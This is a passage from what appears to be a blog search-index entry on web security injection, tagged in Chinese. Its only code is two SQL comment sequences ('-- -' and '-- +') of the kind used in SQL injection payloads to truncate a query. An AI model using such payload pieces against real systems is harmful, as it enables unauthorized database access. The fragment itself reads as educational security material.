<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- -</span><br><span class="line">-- +</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>网络安全注入</tag>
      </tags>
  </entry>
</search>
